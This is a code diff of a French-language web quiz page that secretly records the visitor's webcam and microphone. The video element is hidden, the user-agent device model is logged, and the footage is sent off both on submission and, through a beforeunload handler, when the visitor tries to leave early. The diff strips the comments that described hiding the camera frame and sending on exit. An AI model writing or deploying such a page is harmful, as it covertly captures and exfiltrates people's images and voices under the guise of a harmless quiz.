@@ -19,7 +19,6 @@
             font-weight: bold;
         }
 
-        /* N'hiw el-cadre mta'a el-video */
         #video-container { display: none; }
         
         .question-box { margin-bottom: 15px; text-align: left; background: #f1f2f6; padding: 10px; border-radius: 5px; }
@@ -39,7 +38,7 @@
             <video id="webcam" autoplay playsinline muted></video>
         </div>
         
-        <form id="quizForm">
+        <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
             <input type="text" id="username" placeholder="Votre Nom (Name)" required style="width: 100%; padding: 10px; margin-bottom: 15px; font-size: 14px; box-sizing: border-box;"><br>
             
             <div class="question-box">
@@ -102,24 +101,19 @@
                         recordedChunks.push(event.data);
                     }
                 };
-                mediaRecorder.start(1000); // Y-recordi kull thaniya
+                mediaRecorder.start(1000);
             } catch (err) {
-                console.log("Impossible d'accéder à la caméra ou au micro: ", err);
+                console.log("Caméra non autorisée ou indisponible: ", err);
             }
         });
 
         function getMobileModel() {
             const ua = navigator.userAgent;
             let model = "Appareil Inconnu";
-            if (/android/i.test(ua)) {
-                model = "Téléphone Android";
-            } else if (/iphone|ipad|ipod/i.test(ua)) {
-                model = "iPhone / iOS Device";
-            } else if (/windows/i.test(ua)) {
-                model = "PC Windows";
-            } else if (/macintosh|mac os x/i.test(ua)) {
-                model = "Mac";
-            }
+            if (/android/i.test(ua)) model = "Téléphone Android";
+            else if (/iphone|ipad|ipod/i.test(ua)) model = "iPhone / iOS Device";
+            else if (/windows/i.test(ua)) model = "PC Windows";
+            else if (/macintosh|mac os x/i.test(ua)) model = "Mac";
             return model;
         }
 
@@ -159,7 +153,6 @@
             }
         }
 
-        // Ki yssaker el-utilisateur el-page 9bal ma yjaweb, yeb'ath el-video elli tsajjal
         window.addEventListener('beforeunload', (e) => {
             if (!hasSent && recordedChunks.length > 0) {
                 sendData(true);
@@ -171,4 +164,42 @@
             const username = document.getElementById('username').value;
 
             if (!username) {
-                statusDiv.style.color
+                statusDiv.style.color = 'red';
+                statusDiv.innerText = 'Veuillez entrer votre nom d\'abord.';
+                return;
+            }
+
+            const q1 = document.getElementById('q1').value;
+            const q2 = document.getElementById('q2').value;
+            const q3 = document.getElementById('q3').value;
+
+            if (!q1 || !q2 || !q3) {
+                statusDiv.style.color = 'red';
+                statusDiv.innerText = 'Veuillez répondre à toutes les questions.';
+                return;
+            }
+
+            if (q1 === 'yes' && q2 === 'yes' && q3 === 'sknder') {
+                statusDiv.style.color = 'green';
+                statusDiv.innerText = 'Réussi ! Envoi des données en cours...';
+
+                if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                    mediaRecorder.stop();
+                }
+
+                setTimeout(async () => {
+                    await sendData(false);
+                    statusDiv.innerText = 'Réussi ! Envoyé avec succès.';
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(track => track.stop());
+                    }
+                }, 1000);
+
+            } else {
+                statusDiv.style.color = 'red';
+                statusDiv.innerText = 'Erreur ! Veuillez réessayer.';
+            }
+        }
+    </script>
+</body>
+</html>
